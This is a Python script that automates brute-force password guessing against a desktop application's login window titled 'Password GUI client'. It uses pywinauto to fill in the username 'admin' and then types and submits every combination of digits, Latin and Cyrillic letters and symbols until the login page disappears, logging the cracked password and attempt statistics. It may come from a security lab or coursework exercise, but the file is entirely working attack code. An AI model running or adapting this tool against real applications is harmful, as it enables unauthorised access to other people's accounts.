import time

from pywinauto import Application

from custom_logger import dpi_logger

MASK = 0x3F
BACK_NEW = "uia"
BACK_OLD = "win32"
APP_TITLE = "Password GUI client"


def build_alphabet(bitmask: int) -> str:
    alphabet = ''
    if bitmask & (1 << 0):
        alphabet += '0123456789'
    if bitmask & (1 << 1):
        alphabet += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if bitmask & (1 << 2):
        alphabet += "abcdefghijklmnopqrstuvwxyz"
    if bitmask & (1 << 3):
        alphabet += 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'
    if bitmask & (1 << 4):
        alphabet += 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'
    if bitmask & (1 << 5):
        alphabet += '!@#$%^&*()-_=+[]{}|;:\'",.<>/?`~'
    return alphabet


def hack_pass(start_pass_len=1, app_window=None):
    password_field = app_window.child_window(
        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.passLineEdit",
        control_type="Edit"
    )
    sign_in_button = app_window.child_window(
        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.regLogStackedWidget.logInPage.logInButton",
        control_type="Button"
    )

    alpha = build_alphabet(MASK)
    alpha_len = len(alpha)

    pass_length = start_pass_len
    indexes_list = [0] * pass_length
    attempts = 0

    start_time = time.time()
    while True:
        if not app_window.exists():
            elapsed = time.time() - start_time
            forged_pass = ''.join(alpha[index] for index in indexes_list)
            avg = elapsed / attempts if attempts > 0 else 0

            dpi_logger.info(f"Brute-force interrupted: Target window 'Password GUI client' was closed")
            dpi_logger.info(f"Last tried password: {forged_pass}")
            dpi_logger.info(f"Total attempts: {attempts}")
            dpi_logger.info(f"Total time: {elapsed:.2f} s")
            dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
            return

        forged_pass = ''.join(alpha[index] for index in indexes_list)

        elapsed = time.time() - start_time
        dpi_logger.debug(f"[{attempts}] Trying: {forged_pass} | Elapsed: {elapsed:.2f}s")

        attempts += 1
        if try_password(forged_pass, password_field, sign_in_button, app_window):
            elapsed = time.time() - start_time
            avg = elapsed / attempts
            dpi_logger.info(f"Password hacked: {forged_pass}")
            dpi_logger.info(f"Total attempts: {attempts}")
            dpi_logger.info(f"Total time: {elapsed:.2f} s")
            dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
            return

        curr_pos = pass_length - 1
        while curr_pos >= 0:
            if (indexes_list[curr_pos] + 1) < alpha_len:
                indexes_list[curr_pos] += 1
                break
            else:
                indexes_list[curr_pos] = 0
                curr_pos -= 1
        else:
            pass_length += 1
            indexes_list = [0] * pass_length


def try_password(password: str, pass_field, sign_button, main_win) -> bool:
    pass_field.set_text(password)
    sign_button.click()
    time.sleep(0.1)

    login_page = main_win.child_window(
        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage",
        control_type="Group"
    )
    if not login_page.exists():
        return True

    return False


def start_brute(login):
    # Connect to app window
    try:
        app = Application(backend=BACK_NEW).connect(title=APP_TITLE)
    except Exception as e:
        dpi_logger.error(f"Could not connect to window {APP_TITLE}: {e}")
        return

    main_wnd = app.top_window()
    dpi_logger.info(f"Window captured: {main_wnd.window_text()}")

    try:
        login_field = main_wnd.child_window(
            auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.userNameLineEdit",
            control_type="Edit"
        )
        if login_field.exists():
            login_field.set_text(login)
            time.sleep(0.01)

        # Start brute
        hack_pass(start_pass_len=2, app_window=main_wnd)
    except Exception as e:
        dpi_logger.warning(f"Error: {e}")


if __name__ == "__main__":
    start_brute("admin")
